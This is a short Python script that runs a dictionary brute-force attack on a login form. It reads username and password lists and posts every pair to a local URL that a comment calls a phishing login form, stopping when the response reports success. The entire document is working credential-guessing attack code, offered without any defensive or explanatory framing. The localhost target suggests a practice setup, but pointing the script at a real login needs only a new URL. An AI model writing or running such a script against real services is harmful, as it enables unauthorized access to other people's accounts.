import requests

# The target URL of your phishing login form
url = "http://127.0.0.1:5000/login"

# Load usernames and passwords from files
with open("usernames.txt", "r") as user_file:
    usernames = [line.strip() for line in user_file]

with open("passwords.txt", "r") as pass_file:
    passwords = [line.strip() for line in pass_file]

# Brute force attempt
for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        if "Login successful" in response.text:
            print(f"[✅ SUCCESS] {username}:{password}")
            exit()
        else:
            print(f"[❌ FAIL] {username}:{password}")
